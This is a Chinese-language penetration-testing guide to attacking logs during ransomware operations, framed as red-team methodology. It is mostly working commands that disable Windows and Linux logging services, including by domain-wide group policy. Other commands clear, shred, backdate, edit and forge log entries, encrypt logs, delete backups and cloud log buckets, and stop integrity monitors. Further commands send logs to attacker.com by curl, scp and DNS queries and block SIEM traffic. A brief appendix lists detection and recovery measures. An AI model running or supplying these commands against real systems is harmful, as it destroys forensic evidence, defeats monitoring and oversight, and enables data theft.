# 勒索软件日志攻击技术

---

## 第一部分：文档概述

### 1.1 编写目的
本文档基于 CISA 数据完整性指南，为渗透测试人员提供勒索软件攻击中日志系统利用和规避的系统化方法论。文档涵盖勒索软件攻击各阶段的日志攻击技术，包括日志清除、日志篡改、日志加密和日志 exfiltration。

### 1.2 适用范围
本文档适用于以下场景：
- 勒索软件渗透测试演练
- 事件响应准备度评估
- 日志备份恢复能力测试
- 勒索软件检测能力验证

### 1.3 读者对象
- 渗透测试工程师
- 红队成员
- 事件响应人员
- 安全运营分析师

---

## 第二部分：核心渗透技术专题

### 2.1 技术介绍

勒索软件攻击通常包含对日志系统的针对性攻击，以隐藏攻击痕迹、阻碍事件响应和取证分析。

**攻击阶段与日志利用：**

| **攻击阶段** | **日志攻击技术** | **目的** |
| :--- | :--- | :--- |
| **初始访问** | 规避日志记录 | 隐藏入侵痕迹 |
| **执行** | 禁用日志服务 | 阻止后续活动被记录 |
| **持久化** | 修改日志配置 | 确保持续隐藏 |
| **权限提升** | 清除审计日志 | 隐藏提权痕迹 |
| **防御规避** | 日志清除/篡改 | 阻碍检测和响应 |
| **凭证访问** | 清除安全日志 | 隐藏凭证窃取 |
| **发现** | 选择性日志记录 | 仅记录正常活动 |
| **横向移动** | 日志注入混淆 | 混淆攻击路径 |
| **收集** | 日志 exfiltration | 窃取审计证据 |
| **影响** | 日志加密/删除 | 完成攻击链隐藏 |

### 2.2 攻击常见于哪些业务场景

| **业务场景** | **功能示例** | **风险点描述** |
| :--- | :--- | :--- |
| **Windows 域环境** | Active Directory | 组策略推送禁用日志 |
| **Linux 服务器** | 关键业务服务器 | 停止 rsyslog 服务 |
| **数据库系统** | SQL/NoSQL 数据库 | 清除审计日志 |
| **备份系统** | Veeam、Commvault | 加密备份和日志 |
| **SIEM 系统** | Splunk、ELK | 阻断日志传输 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**日志服务状态探测：**
```bash
# Windows 系统
# 检查日志服务状态
sc query WinDefend
sc query wuauserv
sc query BITS
Get-Service -Name "*log*"

# 检查事件日志配置
wevtutil el  # 列出所有日志
wevtutil gl Security  # 查看安全日志配置

# Linux 系统
# 检查日志服务
systemctl status rsyslog
systemctl status syslog-ng
systemctl status journald

# 检查日志文件权限
ls -la /var/log/
```

**日志清除痕迹探测：**
```bash
# Windows 系统
# 检查日志清除痕迹
Get-WinEvent -LogName Security -MaxEvents 1000 | Where-Object {$_.Id -eq 1102}
# 事件 ID 1102 表示日志被清除

# 检查时间缺口
Get-WinEvent -LogName Security | Select-Object TimeCreated | Sort-Object TimeCreated

# Linux 系统
# 检查日志时间缺口
ls -lt /var/log/
# 检查日志文件时间是否连续

# 检查日志轮转
ls -la /var/log/*.gz
```

#### 2.3.2 白盒测试

**组策略审计：**
```powershell
# 检查禁用日志的组策略
Get-GPO -All | ForEach-Object {
    Get-GPOReport -Guid $_.Id -ReportType Xml | Select-String "Audit"
}

# 检查注册表修改
reg query "HKLM\SYSTEM\CurrentControlSet\Services\EventLog"
```

**日志配置审计：**
```bash
# rsyslog 配置检查
cat /etc/rsyslog.conf
cat /etc/rsyslog.d/*.conf

# 危险配置：
# - 日志输出到 /dev/null
# - 日志级别设置为 OFF
# - 远程日志被禁用
```

### 2.4 漏洞利用方法

#### 2.4.1 日志服务禁用

**Windows 日志服务禁用：**
```powershell
# 停止事件日志服务（需要 SYSTEM 权限）
Stop-Service -Name "EventLog" -Force

# 禁用事件日志服务
Set-Service -Name "EventLog" -StartupType Disabled

# 通过组策略禁用日志
# 创建 GPO 推送到域内机器
New-GPO -Name "Disable Event Logging"
Set-GPRegistryValue -Name "Disable Event Logging" `
    -Key "HKLM\SYSTEM\CurrentControlSet\Services\EventLog" `
    -ValueName "Start" -Type DWORD -Value 4

# 链接 GPO 到 OU
New-GPLink -Name "Disable Event Logging" -Target "OU=Servers,DC=domain,DC=com"
```

**Linux 日志服务禁用：**
```bash
# 停止日志服务
systemctl stop rsyslog
systemctl disable rsyslog

# 停止 journald
systemctl stop systemd-journald
systemctl disable systemd-journald

# 杀死日志进程
pkill -f rsyslog
pkill -f syslog-ng

# 移除日志二进制文件
mv /usr/sbin/rsyslogd /usr/sbin/rsyslogd.bak
```

#### 2.4.2 日志清除技术

**Windows 日志清除：**
```powershell
# 清空所有事件日志
wevtutil el | ForEach-Object { wevtutil cl $_ }

# 清空特定日志
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# 使用 PowerShell 清除
Clear-EventLog -Name Security
Clear-EventLog -Name System

# 删除日志文件
Remove-Item C:\Windows\System32\winevt\Logs\*.* -Force

# 使用 sdelete 安全删除（覆盖写入）
sdelete -z C:\Windows\System32\winevt\Logs\
```

**Linux 日志清除：**
```bash
# 清空日志文件
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > /var/log/secure

# 使用 truncate
truncate -s 0 /var/log/*.log

# 删除日志文件
rm -f /var/log/*.log
rm -f /var/log/*.gz
rm -f /var/log/journal/*

# 使用 shred 安全删除
shred -u /var/log/auth.log
shred -u /var/log/syslog

# 删除 journal 日志
journalctl --rotate
journalctl --vacuum-time=1s
```

#### 2.4.3 日志篡改技术

**时间戳篡改：**
```bash
# Linux 系统
# 修改日志文件时间戳
touch -d "2024-01-01 00:00:00" /var/log/auth.log
touch -d "2024-01-01 00:00:00" /var/log/syslog

# 批量修改
for log in /var/log/*.log; do
    touch -d "2024-06-15 12:00:00" $log
done

# Windows 系统
# 使用 PowerShell 修改文件时间
powershell -c "(Get-Item C:\Windows\System32\winevt\Logs\Security.evtx).LastWriteTime = '2024-01-01 00:00:00'"
```

**日志内容篡改：**
```bash
# Linux 系统
# 删除特定行
sed -i '/attacker_ip/d' /var/log/auth.log
sed -i '/suspicious_activity/d' /var/log/syslog

# 替换内容
sed -i 's/attacker_ip/127.0.0.1/g' /var/log/auth.log

# 注入虚假日志
echo "Jan  1 00:00:00 server sshd[1234]: Accepted password for admin from 127.0.0.1" >> /var/log/auth.log
```

#### 2.4.4 日志加密/锁定

**日志文件加密：**
```bash
# Linux 系统
# 加密日志文件
openssl enc -aes-256-cbc -salt -in /var/log/auth.log -out /var/log/auth.log.enc
rm /var/log/auth.log

# 设置不可变标志（锁定日志）
chattr +i /var/log/auth.log

# Windows 系统
# 使用 EFS 加密
cipher /e C:\Windows\System32\winevt\Logs\

# 使用 PowerShell 加密
Protect-CmsMessage -Content (Get-Content C:\log.txt) -To "CN=Ransomware" | Out-File C:\log.txt.enc
```

**日志存储锁定：**
```bash
# 修改日志文件权限
chmod 000 /var/log/*.log
chown root:root /var/log/*.log

# 设置 SELinux 上下文
chcon -t unlabel_t /var/log/*.log
```

#### 2.4.5 日志 Exfiltration

**日志数据窃取：**
```bash
# 打包日志
tar -czf logs.tar.gz /var/log/
zip -r logs.zip /var/log/

# 外传日志
curl -X POST -F "file=@logs.tar.gz" http://attacker.com/upload
scp logs.tar.gz attacker@attacker.com:/tmp/

# 通过 DNS 外传（小量日志）
for line in $(cat /var/log/auth.log); do
    echo $line | base64 | xargs -I {} dig {}.attacker.com
done
```

**远程日志阻断：**
```bash
# 阻断日志传输到 SIEM
# 防火墙规则
iptables -A OUTPUT -d siem_server -p tcp --dport 514 -j DROP
iptables -A OUTPUT -d siem_server -p udp --dport 514 -j DROP

# Windows 防火墙
netsh advfirewall firewall add rule name="Block Syslog" dir=out action=block remoteip=siem_server
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过日志备份

**识别并清除备份日志：**
```bash
# 查找备份位置
find / -name "*.log.bak" 2>/dev/null
find / -name "*backup*log*" 2>/dev/null
find /backup -name "*.log" 2>/dev/null
find /var/backup -name "*.log" 2>/dev/null

# 清除备份
rm -f /backup/logs/*.log
rm -f /var/backup/*.log
rm -f /*.log.bak

# 清除云备份
aws s3 rm s3://backup-bucket/logs/ --recursive
```

#### 2.5.2 绕过远程日志

**攻击远程日志服务器：**
```bash
# 如果日志发送到远程服务器
# SSH 到远程服务器清除
ssh compromised_server "rm /var/log/remote_logs/target.log"

# 或通过 API 清除（如果有凭证）
curl -X DELETE "http://siem/api/logs" -H "Authorization: Bearer $TOKEN"
```

**阻断日志传输：**
```bash
# 在传输窗口内完成攻击
# 日志通常有传输延迟（几秒到几分钟）
# 在延迟窗口内完成攻击并清除本地日志

# 阻断网络连接
iptables -A OUTPUT -d syslog_server -j DROP
tc qdisc add dev eth0 root netem loss 100%
```

#### 2.5.3 绕过文件监控

**停止监控服务：**
```bash
# 停止文件监控服务
systemctl stop aide
systemctl stop ossec
systemctl stop tripwire

# 禁用监控
systemctl disable aide
systemctl disable ossec

# 修改监控配置
echo "" > /etc/aide/aide.conf
echo "" > /var/ossec/etc/ossec.conf
```

---

## 第三部分：附录

### 3.1 勒索软件日志攻击检查清单

| **攻击技术** | **Windows 命令** | **Linux 命令** |
| :--- | :--- | :--- |
| 停止日志服务 | `Stop-Service EventLog` | `systemctl stop rsyslog` |
| 清空日志 | `wevtutil cl Security` | `echo "" > /var/log/auth.log` |
| 删除日志文件 | `Remove-Item Logs\*` | `rm -f /var/log/*.log` |
| 修改时间戳 | `(Get-Item).LastWriteTime=` | `touch -d "2024-01-01"` |
| 加密日志 | `cipher /e Logs\` | `openssl enc -aes-256-cbc` |
| 锁定日志 | `icacls Logs /deny Everyone:F` | `chmod 000 /var/log/*` |

### 3.2 检测和恢复建议

**检测措施：**
- 监控日志服务状态变化
- 监控日志文件大小和时间戳异常
- 监控日志清除事件（Windows 事件 ID 1102）
- 实施日志完整性监控

**恢复措施：**
- 保持离线日志备份
- 配置日志远程存储（独立网络）
- 实施 WORM（Write Once Read Many）存储
- 定期测试日志恢复流程

### 3.3 参考资源

- [CISA Data Integrity: Recovering from Ransomware](https://www.cisa.gov/data-integrity-recovering-ransomware)
- [CISA Data Integrity: Identifying and Protecting Assets](https://www.cisa.gov/data-integrity-identifying-and-protecting-assets)
- [CISA Data Integrity: Detecting and Responding](https://www.cisa.gov/data-integrity-detecting-and-responding)
- [MITRE ATT&CK - Indicator Removal: Event Log](https://attack.mitre.org/techniques/T1070/001/)
- [NIST 800-61r2 Incident Response Guide](https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final)

---

**文档版本**: 1.0
**最后更新**: 2026 年 3 月
**适用技能**: security-logging-alerting-failures (OWASP Top 10 A09:2025)
